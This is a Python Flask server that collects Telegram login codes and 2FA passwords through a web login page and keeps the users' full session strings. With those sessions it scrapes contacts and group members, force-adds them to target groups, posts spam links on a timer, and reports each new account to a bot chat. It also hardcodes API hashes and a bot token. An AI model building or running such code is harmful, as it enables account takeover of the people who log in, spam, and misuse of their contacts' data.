#!/usr/bin/env python3
"""
Telegram Auto-Add Server - COMPLETE REWRITE
Fixed OTP Sending + Auto Add + Share Control + Premium Emojis
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict
import traceback
import sys
import signal
import re
import logging.handlers

# ============================================
# BASIC SETUP
# ============================================
os.makedirs('logs', exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    handlers=[
        logging.handlers.RotatingFileHandler('logs/server.log', maxBytes=10*1024*1024, backupCount=5),
        logging.StreamHandler()
    ],
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ============================================
# CONFIGURATION
# ============================================
SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Habesha_tg_market', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# ============================================
# GLOBAL STORAGE
# ============================================
accounts = []
temp_sessions = {}  # session_id -> {phone, hash, session, ...}
user_phone_map = {}  # telegram_id -> phone
auto_add_settings = {}
running_tasks = {}
running_share_tasks = {}
worker_adds = defaultdict(list)
share_groups = []

# Share configuration
share_config = {
    'messages': ["🔥🔥🔥\n🔥 t.me/abe_army 🔥\n🔥🔥🔥"],
    'current_message_index': 0,
    'share_interval_seconds': 300,
    'share_delay_between_groups': 20,
    'auto_share_enabled': True,
    'rotate_messages': True,
    'use_premium_emojis': True
}

share_stats = {'total_shares': 0, 'today_shares': 0, 'last_share_time': None, 'errors': 0}

stats = {
    'total_added': 0, 'today_added': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {}, 'dead_accounts_removed': 0
}

# Rate limiting for OTP
otp_cooldowns = {}  # phone -> timestamp
OTP_COOLDOWN = 90  # 90 seconds between OTP requests

file_lock = threading.Lock()

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
    except:
        pass
    return default

def save_json(path, data):
    try:
        temp_path = f"{path}.tmp"
        with open(temp_path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        os.replace(temp_path, path)
    except Exception as e:
        logger.error(f"Save error {path}: {e}")

def save_all_data():
    """Save all persistent data"""
    save_json('accounts.json', accounts)
    save_json('auto_add_settings.json', auto_add_settings)
    save_json('stats.json', stats)
    save_json('worker_adds.json', dict(worker_adds))
    save_json('share_groups.json', share_groups)
    save_json('share_config.json', share_config)
    save_json('user_map.json', user_phone_map)

# ============================================
# EVENT LOOP HELPER
# ============================================
def run_async(func, timeout=30):
    """Run async function in a thread-safe way"""
    try:
        try:
            loop = asyncio.get_event_loop()
        except:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        return loop.run_until_complete(asyncio.wait_for(func(), timeout=timeout))
    except asyncio.TimeoutError:
        logger.warning("Async timeout")
        raise
    except Exception as e:
        logger.error(f"Async error: {e}")
        raise

# ============================================
# OTP / CODE SENDING - SIMPLIFIED AND FIXED
# ============================================
def send_telegram_code(phone, telegram_id='', first_name='', last_name='', username=''):
    """Send verification code - SIMPLIFIED VERSION"""
    
    # Clean phone
    phone = str(phone).strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    if not phone.startswith('+'):
        phone = '+' + phone
    
    # Validate
    digits = ''.join(c for c in phone if c.isdigit())
    if len(digits) < 7:
        return {'success': False, 'error': 'Phone number too short'}
    
    # Check cooldown
    now = time.time()
    if phone in otp_cooldowns:
        last = otp_cooldowns[phone]
        if now - last < OTP_COOLDOWN:
            wait = int(OTP_COOLDOWN - (now - last))
            return {'success': False, 'error': f'Please wait {wait} seconds before requesting another code.'}
    
    # Check existing valid session
    for sid, data in list(temp_sessions.items()):
        if data.get('phone') == phone:
            age = now - data.get('created_at', 0)
            if age < 300:  # Session still valid (5 min)
                masked = phone[:4] + '****' + phone[-3:]
                return {
                    'success': True,
                    'session_id': sid,
                    'phone_masked': masked,
                    'already_sent': True
                }
    
    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        
        try:
            # Connect
            await client.connect()
            
            # Send code
            logger.info(f"Sending code to {phone[:4]}****{phone[-3:]}")
            
            try:
                result = await client.send_code_request(phone)
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.', 'wait': e.seconds}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'Phone number is banned'}
            except Exception as e:
                # Try SMS fallback
                try:
                    result = await client.send_code_request(phone, force_sms=True)
                except:
                    return {'success': False, 'error': f'Failed to send code: {str(e)[:100]}'}
            
            # Save session
            sid = str(int(time.time() * 1000))
            temp_sessions[sid] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save(),
                'created_at': time.time(),
                'telegram_id': str(telegram_id),
                'first_name': first_name,
                'last_name': last_name,
                'username': username,
                'code_attempts': 0,
                'password_attempts': 0
            }
            
            # Update cooldown
            otp_cooldowns[phone] = time.time()
            
            masked = phone[:4] + '****' + phone[-3:]
            logger.info(f"✅ Code sent to {masked}")
            
            return {
                'success': True,
                'session_id': sid,
                'phone_masked': masked
            }
            
        except Exception as e:
            logger.error(f"Send code error: {e}")
            return {'success': False, 'error': 'Server error. Please try again.'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    return run_async(_send, timeout=45)

# ============================================
# VERIFY CODE - SIMPLIFIED
# ============================================
def verify_telegram_code(code, session_id, password=''):
    """Verify the code and create account"""
    
    if not session_id or session_id not in temp_sessions:
        return {'success': False, 'error': 'Session expired. Please request new code.'}
    
    session_data = temp_sessions[session_id]
    
    # Check attempts
    if session_data.get('code_attempts', 0) >= 5:
        del temp_sessions[session_id]
        return {'success': False, 'error': 'Too many attempts. Start over.'}
    
    async def _verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        
        try:
            await client.connect()
            
            # Sign in
            try:
                await client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash'])
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                try:
                    await client.sign_in(password=password)
                except:
                    session_data['password_attempts'] = session_data.get('password_attempts', 0) + 1
                    return {'success': False, 'error': 'Wrong password'}
            except errors.PhoneCodeInvalidError:
                session_data['code_attempts'] = session_data.get('code_attempts', 0) + 1
                remaining = 5 - session_data['code_attempts']
                if remaining <= 0:
                    del temp_sessions[session_id]
                    return {'success': False, 'error': 'Too many attempts'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts left.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Request new one.'}
            
            # Get user info
            me = await client.get_me()
            
            # Save phone mapping
            if me.id:
                user_phone_map[str(me.id)] = session_data['phone']
            
            # Create account
            new_account = {
                'id': int(time.time() * 1000),
                'phone': me.phone or session_data['phone'],
                'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
                'username': me.username or '',
                'session': client.session.save(),
                'active': True,
                'telegram_id': str(me.id) if me.id else ''
            }
            
            # Check if account already exists
            existing = None
            for acc in accounts:
                if acc.get('telegram_id') == str(me.id):
                    existing = acc
                    break
            
            if existing:
                existing.update(new_account)
                new_account = existing
            else:
                accounts.append(new_account)
            
            # Setup auto-add
            auto_add_settings[str(new_account['id'])] = {
                'enabled': True,
                'delay_seconds': 30
            }
            
            # Initialize stats
            if 'worker_stats' not in stats:
                stats['worker_stats'] = {}
            stats['worker_stats'][str(new_account['id'])] = {'total': 0, 'today': 0}
            
            # Save everything
            save_all_data()
            
            # Start workers
            start_auto_add_worker(new_account)
            start_auto_share_worker(new_account)
            
            # Clean temp session
            del temp_sessions[session_id]
            
            # Notify
            try:
                requests.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                    json={
                        'chat_id': REPORT_CHAT_ID,
                        'text': f"<b>{SERVER_NAME}</b>\n✅ New: {new_account['name']}\n📱 {new_account['phone'][:4]}****",
                        'parse_mode': 'HTML'
                    },
                    timeout=5
                )
            except:
                pass
            
            return {
                'success': True,
                'account': {
                    'id': new_account['id'],
                    'name': new_account['name'],
                    'phone': new_account['phone']
                }
            }
            
        except Exception as e:
            logger.error(f"Verify error: {e}")
            return {'success': False, 'error': str(e)[:200]}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    return run_async(_verify, timeout=45)

# ============================================
# AUTO-ADD WORKER
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.running = True
        self.client = None
    
    def run(self):
        logger.info(f"🚀 Auto-add started for {self.account.get('name')}")
        
        while self.running:
            try:
                if not self.running:
                    break
                
                # Check settings
                settings = auto_add_settings.get(str(self.account['id']), {})
                if not settings.get('enabled', True):
                    time.sleep(10)
                    continue
                
                # Connect
                if not self.connect():
                    time.sleep(30)
                    continue
                
                # Get users from contacts and groups
                users = self.get_users()
                if not users:
                    time.sleep(60)
                    continue
                
                # Add users to target groups
                delay = settings.get('delay_seconds', 30)
                added = 0
                
                for user_id in users[:50]:
                    if not self.running:
                        break
                    
                    try:
                        if self.add_to_targets(user_id):
                            added += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                    except:
                        pass
                    
                    time.sleep(random.uniform(delay * 0.8, delay * 1.2))
                
                logger.info(f"Worker cycle: Added {added} users")
                save_json('stats.json', stats)
                time.sleep(random.randint(60, 120))
                
            except Exception as e:
                logger.error(f"Worker error: {e}")
                time.sleep(30)
        
        self.disconnect()
    
    def connect(self):
        try:
            if self.client and hasattr(self.client, 'is_connected') and self.client.is_connected():
                return True
            
            self.client = TelegramClient(
                StringSession(self.account['session']),
                API_ID, API_HASH,
                connection_retries=3,
                timeout=30
            )
            run_async(lambda: self.client.connect(), timeout=15)
            return True
        except:
            return False
    
    def disconnect(self):
        if self.client:
            try:
                run_async(lambda: self.client.disconnect(), timeout=5)
            except:
                pass
            self.client = None
    
    def get_users(self):
        users = set()
        
        async def _collect():
            # From contacts
            try:
                contacts = await self.client(GetContactsRequest(0))
                for u in contacts.users:
                    if not u.bot and not u.deleted:
                        users.add(u.id)
            except:
                pass
            
            # From target groups
            for target in TARGET_GROUPS:
                try:
                    entity = await self.client.get_entity(target)
                    participants = await self.client.get_participants(entity, limit=100)
                    for u in participants:
                        if not u.bot and not u.deleted:
                            users.add(u.id)
                except:
                    pass
            
            return list(users)
        
        try:
            result = run_async(_collect, timeout=45)
            return result if result else list(users)
        except:
            return list(users)
    
    def add_to_targets(self, user_id):
        for target in TARGET_GROUPS:
            async def _add():
                entity = await self.client.get_entity(target)
                user = await self.client.get_input_entity(user_id)
                await self.client(InviteToChannelRequest(entity, [user]))
                return True
            
            try:
                run_async(_add, timeout=15)
                return True
            except:
                pass
        return False
    
    def stop(self):
        self.running = False
        self.disconnect()

# ============================================
# AUTO-SHARE WORKER
# ============================================
class AutoShareWorker:
    def __init__(self, account):
        self.account = account
        self.running = True
        self.client = None
        self.last_share = 0
    
    def run(self):
        logger.info(f"📢 Auto-share started for {self.account.get('name')}")
        
        while self.running:
            try:
                if not share_config.get('auto_share_enabled', True):
                    time.sleep(10)
                    continue
                
                interval = share_config.get('share_interval_seconds', 300)
                
                if time.time() - self.last_share < interval:
                    time.sleep(10)
                    continue
                
                if not self.connect():
                    time.sleep(30)
                    continue
                
                # Get message
                messages = share_config.get('messages', ["🔥 t.me/abe_army 🔥"])
                if share_config.get('rotate_messages') and len(messages) > 1:
                    idx = share_config.get('current_message_index', 0)
                    message = messages[idx % len(messages)]
                    share_config['current_message_index'] = (idx + 1) % len(messages)
                else:
                    message = messages[0]
                
                # Share to groups
                if not share_groups:
                    share_groups.extend(TARGET_GROUPS)
                
                for group in list(share_groups):
                    if not self.running:
                        break
                    
                    async def _share():
                        entity = await self.client.get_entity(group)
                        await self.client.send_message(entity, message)
                    
                    try:
                        run_async(_share, timeout=15)
                        share_stats['total_shares'] += 1
                        share_stats['today_shares'] += 1
                        share_stats['last_share_time'] = datetime.now().isoformat()
                        logger.info(f"✅ Shared to {group}")
                    except:
                        logger.warning(f"Failed to share to {group}")
                    
                    time.sleep(share_config.get('share_delay_between_groups', 20))
                
                self.last_share = time.time()
                
            except Exception as e:
                logger.error(f"Share error: {e}")
                time.sleep(30)
        
        self.disconnect()
    
    def connect(self):
        try:
            if self.client and hasattr(self.client, 'is_connected') and self.client.is_connected():
                return True
            
            self.client = TelegramClient(
                StringSession(self.account['session']),
                API_ID, API_HASH,
                connection_retries=3,
                timeout=30
            )
            run_async(lambda: self.client.connect(), timeout=15)
            return True
        except:
            return False
    
    def disconnect(self):
        if self.client:
            try:
                run_async(lambda: self.client.disconnect(), timeout=5)
            except:
                pass
            self.client = None
    
    def stop(self):
        self.running = False
        self.disconnect()

# ============================================
# WORKER MANAGEMENT
# ============================================
def start_auto_add_worker(account):
    acc_key = str(account['id'])
    if acc_key in running_tasks:
        running_tasks[acc_key]['worker'].stop()
    worker = AutoAddWorker(account)
    thread = threading.Thread(target=worker.run, daemon=True)
    thread.start()
    running_tasks[acc_key] = {'thread': thread, 'worker': worker}

def start_auto_share_worker(account):
    acc_key = str(account['id'])
    if acc_key in running_share_tasks:
        running_share_tasks[acc_key]['worker'].stop()
    worker = AutoShareWorker(account)
    thread = threading.Thread(target=worker.run, daemon=True)
    thread.start()
    running_share_tasks[acc_key] = {'thread': thread, 'worker': worker}

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard_page():
    return send_file('dashboard.html')

@app.route('/control')
def control_page():
    try:
        return send_file('control.html')
    except:
        return "control.html not found", 404

@app.route('/ping')
def ping():
    return jsonify({'status': 'ok', 'server': SERVER_NAME})

# ============================================
# OTP API - SIMPLE AND RELIABLE
# ============================================

@app.route('/api/send-code', methods=['POST'])
def api_send_code():
    """Send verification code"""
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        result = send_telegram_code(phone)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Send code API error: {e}")
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/share-phone', methods=['POST'])
def api_share_phone():
    """Share phone from Telegram WebApp"""
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        first_name = data.get('firstName', '')
        last_name = data.get('lastName', '')
        username = data.get('username', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        # Save phone mapping
        if telegram_id:
            user_phone_map[telegram_id] = phone
        
        result = send_telegram_code(phone, telegram_id, first_name, last_name, username)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Share phone error: {e}")
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/add-account', methods=['POST'])
def api_add_account():
    """Add account - same as send code"""
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        result = send_telegram_code(phone, telegram_id)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/verify-code', methods=['POST'])
def api_verify_code():
    """Verify code and login"""
    try:
        data = request.json or {}
        code = data.get('code', '').strip()
        session_id = data.get('session_id', '')
        password = data.get('password', '')
        
        if not code or not session_id:
            return jsonify({'success': False, 'error': 'Code and session required'})
        
        result = verify_telegram_code(code, session_id, password)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Verify code API error: {e}")
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/telegram-auto-login', methods=['POST'])
def api_auto_login():
    """Auto login for Telegram users"""
    try:
        data = request.json or {}
        user_data = data.get('user', {})
        telegram_id = str(user_data.get('id', ''))
        
        if not telegram_id:
            return jsonify({'success': False, 'needs_phone': True})
        
        # Check if we have phone
        phone = user_phone_map.get(telegram_id)
        if not phone:
            # Check accounts
            for acc in accounts:
                if str(acc.get('telegram_id')) == telegram_id:
                    phone = acc.get('phone')
                    break
        
        if phone:
            result = send_telegram_code(phone, telegram_id)
            result['auto_detected'] = True
            return jsonify(result)
        else:
            return jsonify({
                'success': False,
                'needs_phone': True,
                'request_phone_share': True
            })
            
    except Exception as e:
        return jsonify({'success': False, 'needs_phone': True})

# ============================================
# SHARE CONTROL API
# ============================================

@app.route('/api/share-config', methods=['GET'])
def get_share_config():
    return jsonify({'success': True, 'config': share_config})

@app.route('/api/share-config', methods=['POST'])
def update_share_config():
    try:
        data = request.json or {}
        
        if 'messages' in data:
            share_config['messages'] = data['messages']
        if 'share_interval_seconds' in data:
            val = int(data['share_interval_seconds'])
            share_config['share_interval_seconds'] = max(60, min(86400, val))
        if 'share_delay_between_groups' in data:
            val = int(data['share_delay_between_groups'])
            share_config['share_delay_between_groups'] = max(5, min(300, val))
        if 'auto_share_enabled' in data:
            share_config['auto_share_enabled'] = bool(data['auto_share_enabled'])
        if 'rotate_messages' in data:
            share_config['rotate_messages'] = bool(data['rotate_messages'])
        if 'use_premium_emojis' in data:
            share_config['use_premium_emojis'] = bool(data['use_premium_emojis'])
        
        save_json('share_config.json', share_config)
        return jsonify({'success': True, 'config': share_config})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-config/time-presets', methods=['GET'])
def get_time_presets():
    return jsonify({'success': True, 'presets': {
        '1min': 60, '3min': 180, '5min': 300, '10min': 600,
        '15min': 900, '30min': 1800, '1hour': 3600, '2hours': 7200,
        '6hours': 21600, '12hours': 43200, '24hours': 86400
    }})

@app.route('/api/share-stats')
def get_share_stats():
    return jsonify({'success': True, 'stats': share_stats})

@app.route('/api/auto-share/start-all', methods=['POST'])
def start_all_shares():
    for acc in accounts:
        if acc.get('session'):
            start_auto_share_worker(acc)
            time.sleep(1)
    return jsonify({'success': True, 'started': len(running_share_tasks)})

@app.route('/api/auto-share/stop-all', methods=['POST'])
def stop_all_shares():
    for key in list(running_share_tasks.keys()):
        if key in running_share_tasks:
            running_share_tasks[key]['worker'].stop()
            del running_share_tasks[key]
    return jsonify({'success': True})

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        ws = stats.get('worker_stats', {}).get(str(a['id']), {})
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', '')[:4] + '****',
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(str(a['id']), {}).get('enabled', True),
            'stats': {'total_added': ws.get('total', 0), 'today_added': ws.get('today', 0)},
            'is_running': str(a['id']) in running_tasks,
            'is_sharing': str(a['id']) in running_share_tasks
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_api():
    if request.method == 'GET':
        aid = request.args.get('accountId', '')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        settings = auto_add_settings.get(str(aid), {'enabled': False, 'delay_seconds': 30})
        settings['is_running'] = str(aid) in running_tasks
        return jsonify({'success': True, 'settings': settings})
    
    data = request.json or {}
    aid = data.get('accountId', '')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    auto_add_settings[str(aid)] = {
        'enabled': data.get('enabled', True),
        'delay_seconds': max(15, data.get('delay_seconds', 30))
    }
    save_json('auto_add_settings.json', auto_add_settings)
    
    # Start/stop worker
    if data.get('enabled', True):
        acc = next((a for a in accounts if str(a['id']) == str(aid)), None)
        if acc:
            start_auto_add_worker(acc)
    else:
        if str(aid) in running_tasks:
            running_tasks[str(aid)]['worker'].stop()
            del running_tasks[str(aid)]
    
    return jsonify({'success': True})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    aid = request.json.get('accountId', '')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Stop workers
    if str(aid) in running_tasks:
        running_tasks[str(aid)]['worker'].stop()
        del running_tasks[str(aid)]
    if str(aid) in running_share_tasks:
        running_share_tasks[str(aid)]['worker'].stop()
        del running_share_tasks[str(aid)]
    
    # Remove account
    global accounts
    accounts = [a for a in accounts if str(a['id']) != str(aid)]
    save_all_data()
    
    return jsonify({'success': True})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'active_workers': len(running_tasks),
        'active_share_workers': len(running_share_tasks),
        'shares_today': share_stats.get('today_shares', 0),
        'total_shares': share_stats.get('total_shares', 0)
    })

@app.route('/api/health')
def health():
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'accounts': len(accounts),
        'workers': len(running_tasks),
        'share_workers': len(running_share_tasks),
        'today_added': stats.get('today_added', 0),
        'today_shares': share_stats.get('today_shares', 0)
    })

# ============================================
# STARTUP
# ============================================
def init_server():
    """Initialize server data"""
    global accounts, auto_add_settings, stats, worker_adds, share_groups, share_config, user_phone_map
    
    # Load data
    accounts = load_json('accounts.json', [])
    auto_add_settings = load_json('auto_add_settings.json', {})
    stats = load_json('stats.json', {'total_added': 0, 'today_added': 0, 'last_reset': datetime.now().strftime('%Y-%m-%d'), 'worker_stats': {}})
    worker_adds = defaultdict(list, load_json('worker_adds.json', {}))
    share_groups = load_json('share_groups.json', TARGET_GROUPS[:])
    share_config = load_json('share_config.json', share_config)
    user_phone_map = load_json('user_map.json', {})
    
    # Ensure target groups in share groups
    for tg in TARGET_GROUPS:
        if tg not in share_groups:
            share_groups.append(tg)
    
    logger.info(f"Loaded {len(accounts)} accounts, {len(share_groups)} share groups")

def start_workers():
    """Start all workers"""
    for acc in accounts:
        if acc.get('session'):
            try:
                settings = auto_add_settings.get(str(acc['id']), {})
                if settings.get('enabled', True):
                    start_auto_add_worker(acc)
                start_auto_share_worker(acc)
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error starting worker for {acc.get('name')}: {e}")

def keep_alive():
    """Keep alive pings"""
    while True:
        time.sleep(240)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

def reset_daily_stats():
    """Reset daily stats"""
    while True:
        time.sleep(3600)
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['last_reset'] = today
            share_stats['today_shares'] = 0
            save_json('stats.json', stats)

def signal_handler(signum, frame):
    logger.info("Shutting down...")
    save_all_data()
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        print(f"""
╔══════════════════════════════════════════╗
║  AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}  ║
║  API ID: {API_ID}                       ║
║  Port: {PORT}                            ║
║  Targets: {', '.join(TARGET_GROUPS)}     ║
╚══════════════════════════════════════════╝
        """)
        
        init_server()
        
        # Start background threads
        threading.Thread(target=keep_alive, daemon=True).start()
        threading.Thread(target=reset_daily_stats, daemon=True).start()
        threading.Thread(target=start_workers, daemon=True).start()
        
        # Start Flask
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
        
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)
